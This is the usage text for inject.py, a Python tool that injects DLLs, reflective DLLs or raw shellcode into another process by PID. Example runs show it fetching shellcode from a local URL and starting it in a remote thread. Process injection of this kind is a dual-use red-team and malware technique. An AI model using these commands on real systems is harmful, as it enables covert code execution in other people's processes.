inject.py -- injects code into other processes

This script requires administrative privileges.



Usage:



inject.py [-h] [--type TYPE] [--enc ENC] pid file



positional arguments:

  pid

  file



optional arguments:

  -h, --help   show this help message and exit

  --type TYPE  dll, refdll, raw

  --enc ENC    base64



Arguments description:
  
pid: PID of target process
  
file: path or URL of file to be injected


  TYPE: Type of file
 
	-dll:simple dll file

	-refdll:dll which can be injected with reflective dll injection technique

	-raw:raw binary shellcode

  ENC: Encoding of file. Currently only base64 is implemented. It is good enough.





Examples:



$ python inject.py --type refdll 7052 reflective_dll.dll


[+] Debug privilege enabled.

[+] Checking environment:       64 bit system architecture.     Current process is 64 bit (native).     Remote process is 32 bit (WOW64).

[+] Checking DLL file

[+] Dll file OK. Loader function name: _ReflectiveLoader@4, RVA: 1060

[+] Writing DLL data to remote process

[+] Starting ReflectiveLoader (_ReflectiveLoader@4) Start address: 220460

[-] CreateRemoteThread failed

[+] Failing back to NtCreateThreadEx

[+] Remote thread started.





$ python inject.py --type raw 7052 http://127.0.0.1:8000/x86runnotepad.bin


[+] Debug privilege enabled.

[+] Getting http://127.0.0.1:8000/x86runnotepad.bin

[+] Writing code to remote process

[+] Starting remote code

[-] CreateRemoteThread failed

[+] Failing back to NtCreateThreadEx

[+] Remote thread started.



